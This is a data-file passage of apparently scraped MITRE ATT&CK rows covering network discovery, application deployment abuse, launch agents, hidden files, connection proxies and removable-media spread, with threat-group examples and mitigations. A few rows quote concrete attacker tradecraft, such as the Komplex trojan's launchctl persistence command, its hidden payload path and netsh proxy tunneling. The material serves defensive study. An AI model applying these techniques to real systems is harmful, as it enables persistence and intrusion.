'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: RedLeaves, BUGJUICE",['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
372,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0045|menuPass]] has used several tools to scan for open NetBIOS nameservers and enumerate NetBIOS sessions.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
373,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0100|ipconfig]] can be used to display adapter configuration on Windows systems, including information for TCP/IP, DNS, and DHCP.']",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: ipconfig, ipconfig.exe",['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
374,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0027|Threat Group-3390]] actors use nbtscan to discover vulnerable systems.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
375,['Monitor application deployments from a secondary system. Perform application deployment at regular times so that irregular deployment activity stands out. Monitor process activity that does not correlate to known good software. Monitor account login activity on the deployment system.'],[],['187'],[],"['File monitoring', 'Process use of network', 'Process monitoring']",['[[Group/G0050|APT32]] compromised McAfee ePO to move laterally by distributing malware as a software deployment task.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Grant access to application deployment systems only to a limited number of authorized administrators. Ensure proper system and access isolation for critical network systems through use of firewalls, account privilege separation, group policy, and multifactor authentication. Verify that account credentials that may be used to access deployment systems are unique and not used throughout the enterprise network. Patch deployment systems regularly to prevent potential remote access through [[Technique/T1068|Exploitation of Vulnerability]]. \n\nIf the application deployment system can be configured to deploy only signed binaries, then ensure that the trusted signing certificates are not co-located with the application deployment system and are instead located on a system that cannot be accessed remotely or to which remote access is tightly controlled.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],"['Access to application deployment software (EPO, HPCA, Altiris, etc.)']",[],['Lateral Movement'],['Technique/T1017'],['Application Deployment Software'],https://attack.mitre.org/wiki/Technique/T1017
376,[u'Monitor Launch Agent creation through additional plist files and utilities such as Objective-See\u2019s  KnockKnock application. Launch Agents also require files on disk for persistence which can also be monitored via other file monitoring applications.'],[],[],[],"['File monitoring', 'Process Monitoring']",['The Komplex trojan creates a persistent launch agent called with <code>$HOME/Library/LaunchAgents/com.apple.updates.plist</code> with <code>launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist</code>[[CiteRef::Sofacy Komplex Trojan]].'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"[""Restrict user's abilities to create Launch Agents with group policy.""]","['MacOS', 'OS X']","['User', 'Administrator']",[],Software: Komplex,['Persistence'],['Technique/T1159'],['Launch Agent'],https://attack.mitre.org/wiki/Technique/T1159
377,"['Monitor the file system and shell commands for files being created with a leading ""."" and the Windows command-line use of attrib.exe to add the hidden attribute.']",['Host forensic analysis'],[],[],"['File monitoring', 'Process Monitoring', 'Process command-line parameters']",['The Komplex payload is stored in a hidden directory at <code>/Users/Shared/.local/kextd</code>[[CiteRef::Sofacy Komplex Trojan]].'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],['Mitigation of this technique may be difficult and unadvised due to the the legitimate use of hidden files and directories.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Komplex,"['Defense Evasion', 'Persistence']",['Technique/T1158'],['Hidden Files and Directories'],https://attack.mitre.org/wiki/Technique/T1158
378,"['Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network activities disassociated from user-driven actions from processes that normally require user direction are suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],['Walker Johnson'],"['Process use of network', 'Process monitoring', 'Netflow/Enclave netflow', 'Packet capture']",['[[Software/S0108|netsh]] can be used to set up a proxy tunnel to allow remote host access to an infected host.[[CiteRef::Securelist fileless attacks Feb 2017]]'],['Carbanak'],"['Carbanak', 'Anunak']",['G0008'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: netsh, netsh.exe",['Command and Control'],['Technique/T1090'],['Connection Proxy'],https://attack.mitre.org/wiki/Technique/T1090
379,"['Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network activities disassociated from user-driven actions from processes that normally require user direction are suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],['Walker Johnson'],"['Process use of network', 'Process monitoring', 'Netflow/Enclave netflow', 'Packet capture']",['[[Group/G0041|Strider]] has used local servers with both local network and Internet access to act as internal proxy nodes to exfiltrate data from other parts of the network without direct Internet access.[[CiteRef::Kaspersky ProjectSauron Blog]]'],['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1090'],['Connection Proxy'],https://attack.mitre.org/wiki/Technique/T1090
380,"['Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network activities disassociated from user-driven actions from processes that normally require user direction are suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],['Walker Johnson'],"['Process use of network', 'Process monitoring', 'Netflow/Enclave netflow', 'Packet capture']",['[[Software/S0009|Hikit]] supports peer connections.[[CiteRef::Axiom]]'],['Axiom'],"['Axiom', 'Group 72']",['G0001'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Hikit,['Command and Control'],['Technique/T1090'],['Connection Proxy'],https://attack.mitre.org/wiki/Technique/T1090
381,"['Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network activities disassociated from user-driven actions from processes that normally require user direction are suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],['Walker Johnson'],"['Process use of network', 'Process monitoring', 'Netflow/Enclave netflow', 'Packet capture']",['[[Software/S0023|CHOPSTICK]] used a proxy server between victims and the C2 server.[[CiteRef::ESET Sednit Part 2]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: CHOPSTICK, SPLM, ...",['Command and Control'],['Technique/T1090'],['Connection Proxy'],https://attack.mitre.org/wiki/Technique/T1090
382,"['Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network activities disassociated from user-driven actions from processes that normally require user direction are suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],['Walker Johnson'],"['Process use of network', 'Process monitoring', 'Netflow/Enclave netflow', 'Packet capture']",['[[Software/S0117|XTunnel]] relays traffic between a C2 server and a victim.[[CiteRef::Crowdstrike DNC June 2016]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: XTunnel, X-Tunnel, XAPS",['Command and Control'],['Technique/T1090'],['Connection Proxy'],https://attack.mitre.org/wiki/Technique/T1090
383,"['Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network activities disassociated from user-driven actions from processes that normally require user direction are suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],['Walker Johnson'],"['Process use of network', 'Process monitoring', 'Netflow/Enclave netflow', 'Packet capture']","['[[Group/G0007|APT28]] used other victims as proxies to relay command traffic, for instance using a compromised Georgian military email server as a hop point to NATO victims.[[CiteRef::FireEye APT28]] The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router.[[CiteRef::Bitdefender APT28 Dec 2015]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1090'],['Connection Proxy'],https://attack.mitre.org/wiki/Technique/T1090
384,"['Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network activities disassociated from user-driven actions from processes that normally require user direction are suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],['Walker Johnson'],"['Process use of network', 'Process monitoring', 'Netflow/Enclave netflow', 'Packet capture']","['The ""ZJ"" variant of [[Software/S0031|BACKSPACE]] allows ""ZJ link"" infections with Internet access to relay traffic from ""ZJ listen"" to a command server.[[CiteRef::FireEye APT30]]']",['APT30'],['APT30'],['G0013'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: BACKSPACE, Lecna",['Command and Control'],['Technique/T1090'],['Connection Proxy'],https://attack.mitre.org/wiki/Technique/T1090
385,"['Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network activities disassociated from user-driven actions from processes that normally require user direction are suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],['Walker Johnson'],"['Process use of network', 'Process monitoring', 'Netflow/Enclave netflow', 'Packet capture']",['[[Software/S0108|netsh]] can be used to set up a proxy tunnel to allow remote host access to an infected host.[[CiteRef::Securelist fileless attacks Feb 2017]]'],['Naikon'],['Naikon'],['G0019'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: netsh, netsh.exe",['Command and Control'],['Technique/T1090'],['Connection Proxy'],https://attack.mitre.org/wiki/Technique/T1090
386,"['Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network activities disassociated from user-driven actions from processes that normally require user direction are suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],['Walker Johnson'],"['Process use of network', 'Process monitoring', 'Netflow/Enclave netflow', 'Packet capture']","['[[Software/S0154|Cobalt Strike]] can be configured to have commands relayed over a peer-to-peer network of infected hosts.  This can be used to limit the number of egress points, or provide access to a host without direct internet access.[[CiteRef::cobaltstrike manual]]']",['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Cobalt Strike,['Command and Control'],['Technique/T1090'],['Connection Proxy'],https://attack.mitre.org/wiki/Technique/T1090
387,"['Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network activities disassociated from user-driven actions from processes that normally require user direction are suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],['Walker Johnson'],"['Process use of network', 'Process monitoring', 'Netflow/Enclave netflow', 'Packet capture']","['A backdoor used by [[Group/G0016|APT29]] created a TOR hidden service to forward traffic from the TOR client to local ports 3389 (RDP), 139 (Netbios), and 445 (SMB) enabling full remote access from outside the network.[[CiteRef::Mandiant No Easy Breach]]']",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1090'],['Connection Proxy'],https://attack.mitre.org/wiki/Technique/T1090
388,"['Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network activities disassociated from user-driven actions from processes that normally require user direction are suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],['Walker Johnson'],"['Process use of network', 'Process monitoring', 'Netflow/Enclave netflow', 'Packet capture']",['[[Software/S0108|netsh]] can be used to set up a proxy tunnel to allow remote host access to an infected host.[[CiteRef::Securelist fileless attacks Feb 2017]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: netsh, netsh.exe",['Command and Control'],['Technique/T1090'],['Connection Proxy'],https://attack.mitre.org/wiki/Technique/T1090
389,"['Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network activities disassociated from user-driven actions from processes that normally require user direction are suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],['Walker Johnson'],"['Process use of network', 'Process monitoring', 'Netflow/Enclave netflow', 'Packet capture']","[""[[Group/G0045|menuPass]] has used a global service provider's IP as a proxy for C2 traffic from a victim.[[CiteRef::FireEye APT10 April 2017]]""]",['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1090'],['Connection Proxy'],https://attack.mitre.org/wiki/Technique/T1090
390,"['Monitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for [[Command and Control]] and system and network information [[Discovery]].']",[],[],[],"['File monitoring', 'Data loss prevention']",['[[Software/S0130|Unknown Logger]] is capable of spreading to USB devices.[[CiteRef::Forcepoint Monsoon]]'],['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Disable Autorun if it is unnecessary.[[CiteRef::Microsoft Disable Autorun]] Disallow or restrict removable media at an organizational policy level if it is not required for business operations.[[CiteRef::TechNet Removable Media Control]]\n\nIdentify potentially malicious software that may be used to infect removable media or may result from tainted removable media, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],"['Removable media allowed, Autorun enabled or vulnerability present that allows for code execution']",Software: Unknown Logger,['Lateral Movement'],['Technique/T1091'],['Replication Through Removable Media'],https://attack.mitre.org/wiki/Technique/T1091
391,"['Monitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for [[Command and Control]] and system and network information [[Discovery]].']",[],[],[],"['File monitoring', 'Data loss prevention']","[""Part of [[Group/G0007|APT28]]'s operation involved using [[Software/S0023|CHOPSTICK]] modules to copy itself to air-gapped machines and using files written to USB sticks to transfer data and command traffic.[[CiteRef::FireEye APT28]][[CiteRef::Microsoft SIR Vol 19]]""]",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Disable Autorun if it is unnecessary.[[CiteRef::Microsoft Disable Autorun]] Disallow or restrict removable media at an organizational policy level if it is not required for business operations.[[CiteRef::TechNet Removable Media Control]]\n\nIdentify potentially malicious software that may be used to infect removable media or may result from tainted removable media, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],"['Removable media allowed, Autorun enabled or vulnerability present that allows for code execution']","Software: CHOPSTICK, SPLM, ...",['Lateral Movement'],['Technique/T1091'],['Replication Through Removable Media'],https://attack.mitre.org/wiki/Technique/T1091
